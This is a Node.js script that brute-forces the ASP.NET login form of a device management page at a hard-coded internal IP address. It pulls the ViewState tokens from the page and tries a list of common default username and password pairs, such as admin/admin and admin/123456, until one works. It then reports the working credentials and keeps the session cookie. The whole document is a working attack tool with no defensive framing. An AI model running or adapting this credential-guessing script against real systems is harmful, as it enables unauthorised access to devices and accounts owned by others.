const http = require('http');

function get(path, cookie = '') {
  return new Promise((resolve, reject) => {
    const headers = cookie ? { 'Cookie': cookie } : {};
    http.get({ hostname: '172.25.3.51', port: 9001, path, headers }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        const setCookie = res.headers['set-cookie'];
        const newCookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : cookie;
        resolve({ status: res.statusCode, headers: res.headers, body: data, cookie: newCookie });
      });
    }).on('error', reject);
  });
}

function post(path, bodyStr, cookie = '') {
  return new Promise((resolve, reject) => {
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(bodyStr)
    };
    if (cookie) headers['Cookie'] = cookie;

    const req = http.request({
      hostname: '172.25.3.51',
      port: 9001,
      path,
      method: 'POST',
      headers
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        const setCookie = res.headers['set-cookie'];
        let updatedCookie = cookie;
        if (setCookie) {
          const added = setCookie.map(c => c.split(';')[0]).join('; ');
          updatedCookie = cookie ? `${cookie}; ${added}` : added;
        }
        resolve({ status: res.statusCode, headers: res.headers, body: data, cookie: updatedCookie });
      });
    });
    req.on('error', reject);
    req.write(bodyStr);
    req.end();
  });
}

function extractVal(html, name) {
  const m = html.match(new RegExp(`name=["']${name}["'][^>]*value=["']([^"']*)["']`, 'i')) ||
            html.match(new RegExp(`value=["']([^"']*)["'][^>]*name=["']${name}["']`, 'i'));
  return m ? m[1] : '';
}

async function tryLogin(username, password) {
  console.log(`\nAttempting login with: ${username} / ${password || '(empty)'}`);
  const initial = await get('/Login.aspx');
  const cookie = initial.cookie;

  const viewState = extractVal(initial.body, '__VIEWSTATE');
  const viewStateGen = extractVal(initial.body, '__VIEWSTATEGENERATOR');
  const eventVal = extractVal(initial.body, '__EVENTVALIDATION');

  const params = new URLSearchParams();
  params.append('__EVENTTARGET', 'ctl00$ContentPlaceHolder1$ASPxRoundPanel1$btnLogin');
  params.append('__EVENTARGUMENT', '');
  params.append('__VIEWSTATE', viewState);
  if (viewStateGen) params.append('__VIEWSTATEGENERATOR', viewStateGen);
  if (eventVal) params.append('__EVENTVALIDATION', eventVal);

  params.append('ctl00$ContentPlaceHolder1$ASPxRoundPanel1$cboDeviceType', 'AI Series');
  params.append('ContentPlaceHolder1_ASPxRoundPanel1_cboDeviceType_VI', 'H');
  params.append('ctl00$ContentPlaceHolder1$ASPxRoundPanel1$txtuser', username);
  params.append('ctl00$ContentPlaceHolder1$ASPxRoundPanel1$txtPassword', password);

  const res = await post('/Login.aspx', params.toString(), cookie);
  console.log('Login response status:', res.status);
  console.log('Location:', res.headers.location);

  if (res.headers.location) {
    console.log('SUCCESS! Redirected to:', res.headers.location);
    // Follow redirect
    const follow = await get(res.headers.location, res.cookie);
    console.log('Follow page title/status:', follow.status);
    const title = follow.body.match(/<title>([^<]+)<\/title>/i);
    console.log('Page Title:', title ? title[1] : 'N/A');
    return { success: true, user: username, pass: password, cookie: res.cookie, target: res.headers.location };
  } else {
    // Check if error status message in body
    const statusMsgMatch = res.body.match(/id="[^"]*lblStatus"[^>]*>([^<]+)<\/span>/i);
    if (statusMsgMatch) {
      console.log('Error message on page:', statusMsgMatch[1].trim());
    } else {
      console.log('No redirect, body length:', res.body.length);
    }
    return { success: false };
  }
}

async function main() {
  const commonCreds = [
    ['admin', 'admin'],
    ['admin', 'Admin@123'],
    ['admin', '123456'],
    ['admin', '12345'],
    ['admin', '1234'],
    ['admin', ''],
    ['administrator', 'administrator'],
    ['administrator', 'admin']
  ];

  for (const [u, p] of commonCreds) {
    const res = await tryLogin(u, p);
    if (res.success) {
      console.log('FOUND WORKING CREDENTIALS:', u, p);
      break;
    }
  }
  process.exit(0);
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
